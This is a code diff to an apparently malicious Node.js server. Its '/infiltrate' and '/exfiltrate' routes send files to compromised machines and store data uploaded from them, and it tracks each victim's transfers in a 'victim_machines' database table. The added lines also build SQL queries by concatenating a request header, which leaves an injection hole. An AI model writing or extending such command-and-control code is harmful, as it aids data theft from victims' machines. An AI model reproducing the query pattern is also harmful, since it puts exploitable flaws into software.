@@ -51,11 +51,21 @@ app.get('/infiltrate', (req, res)=>{
                 let decoded_output = buff.toString('ascii');
                 var json_output = JSON.parse(decoded_output);
 
-		var file_name = json_output[req.headers.cookie];
+		var file_name = Object.keys(json_output[req.headers.cookie])[0];
 		console.log("Infiltrate File: " + file_name);
 
 		fs.readFile(file_name, function(err, data) {
 			res.send(data);
+		});
+
+		json_output[req.headers.cookie][file_name] = "1";
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET file_names = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
 		});
 	});
 
@@ -107,12 +117,22 @@ app.post('/exfiltrate', (req, res)=>{
                 let decoded_output = buff.toString('ascii');
                 var json_output = JSON.parse(decoded_output);
 
-		var file_name = './uploads/' + json_output[req.headers.cookie];
+		var file_name = './uploads/' + Object.keys(json_output[req.headers.cookie])[0];
 		console.log("File name: " + file_name);
 
 		console.log(req.text);
 		fs.writeFile(file_name, req.text, function (err) {
 			if (err) return console.log(err);
+		});
+
+		json_output[req.headers.cookie][file_name] = "1";
+
+		let buff2 = new Buffer(JSON.stringify(json_output));
+		let b64_final = buff2.toString('base64');
+
+		con.query("UPDATE victim_machines SET file_names = '" + b64_final + "' WHERE victim_id = '" + req.headers.id + "'", function(err, result, fields) {
+			if (err) throw err;
+			console.log(result);
 		});
 	});
 
